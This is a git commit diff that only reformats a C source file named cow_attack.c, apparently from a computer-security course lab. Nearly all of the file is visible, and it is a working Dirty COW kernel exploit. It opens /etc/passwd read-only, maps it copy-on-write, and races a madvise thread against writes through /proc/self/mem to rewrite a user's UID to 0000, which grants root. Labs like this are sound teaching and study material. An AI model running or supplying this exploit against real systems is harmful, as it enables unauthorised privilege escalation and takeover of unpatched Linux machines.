b82b2f21f336d884674d343a3bc34fa933617100
Erhan Tezcan <erhany96@gmail.com>
2021-12-23 16:55:32 +0300

    rnm

--- computer-security/dirty-cow-attack/src/cow_attack.c
+++ computer-security/dirty-cow-attack/src/cow_attack.c
@@ -1,38 +1,37 @@
-#include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
-#include <sys/stat.h>
-#include <string.h>
 #include <stdio.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
 
 void *map;
 void *writeThread(void *arg);
 void *madviseThread(void *arg);
 
-int main(int argc, char *argv[])
-{
-  pthread_t pth1,pth2;
+int main(int argc, char *argv[]) {
+  pthread_t pth1, pth2;
   struct stat st;
   int file_size;
 
   // lines added by Erhan Tezcan
-  const char * filepath = argc == 2 ? argv[1] : "/etc/passwd";
-  printf("Attacking file: %s\n",filepath);
+  const char *filepath = argc == 2 ? argv[1] : "/etc/passwd";
+  printf("Attacking file: %s\n", filepath);
 
   // Open the target file in the read-only mode.
-  int f=open(filepath, O_RDONLY);
+  int f = open(filepath, O_RDONLY);
 
   // Map the file to COW memory using MAP_PRIVATE.
   fstat(f, &st);
   file_size = st.st_size;
-  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+  map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
 
   // Find the position of the target area
-  char *position = strstr(map, "charlie:x:1001");                        
+  char *position = strstr(map, "charlie:x:1001");
 
   // We have to do the attack using two threads.
-  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
-  pthread_create(&pth2, NULL, writeThread, position);             
+  pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
+  pthread_create(&pth2, NULL, writeThread, position);
 
   // line added by Erhan Tezcan
   printf("Waiting for threads to finish. Press CTRL+C to stop.\n");
@@ -43,13 +42,12 @@ int main(int argc, char *argv[])
   return 0;
 }
 
-void *writeThread(void *arg)
-{
-  char *content= "charlie:x:0000";
-  off_t offset = (off_t) arg;
+void *writeThread(void *arg) {
+  char *content = "charlie:x:0000";
+  off_t offset = (off_t)arg;
 
-  int f=open("/proc/self/mem", O_RDWR);
-  while(1) {
+  int f = open("/proc/self/mem", O_RDWR);
+  while (1) {
     // Move the file pointer to the corresponding position.
     lseek(f, offset, SEEK_SET);
 
@@ -58,10 +56,9 @@ void *writeThread(void *arg)
   }
 }
 
-void *madviseThread(void *arg)
-{
-  int file_size = (int) arg;
-  while(1){
+void *madviseThread(void *arg) {
+  int file_size = (int)arg;
+  while (1) {
     madvise(map, file_size, MADV_DONTNEED);
   }
 }
